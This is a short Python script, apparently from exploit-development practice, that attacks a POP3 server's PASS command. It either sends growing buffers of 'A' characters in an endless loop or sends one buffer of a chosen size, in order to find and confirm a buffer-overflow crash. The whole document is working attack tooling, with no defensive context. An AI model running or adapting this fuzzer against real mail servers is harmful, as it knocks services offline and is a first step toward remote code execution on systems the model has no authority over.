#!/usr/bin/env python
#by Anakein
import struct, sys
import socket as so 

try:
    server = str(sys.argv[1])
    port = int(sys.argv[2])

except IndexError:
    print("Usage: python %s 10.0.1.116 110" % sys.argv[0] )
    sys.exit()
    
print('MENU Option: \n')
print('FUZZ pass [1]: ')
print('CheckBuffer [2]: ')

input_user = int(input((">>  ")))
if input_user == 1:
    buf = 'A'
    count = 100
    while True:
        print("Fuzzing PASS with %s bytes" %  len(buf))
        conn = so.socket(so.AF_INET, so.SOCK_STREAM)
        conn.connect((server, port))
        conn.recv(1024)
        conn.send('USER anakein \r\n')
        conn.recv(1024)
        conn.send('PASS ' + buf + '\r\n')
        conn.recv(1024)
        buf = 'A'*count 
        count = count+300
        conn.close()

if input_user == 2:
    buf_size = int(input("Buffer size: "))  
    buf_size = 'A'*buf_size
    try:
        conn = so.socket(so.AF_INET, so.SOCK_STREAM)
        print("Connecting to host") #DEBUG
        conn.connect((server, port))
        conn.recv(1024)
        conn.send('USER anakein \r\n')
        conn.recv(1024)
        conn.send('PASS ' + buf_size + '\r\n')
        conn.close()

    except:
        print("Error! Check your are connection with to host")
        sys.exit()
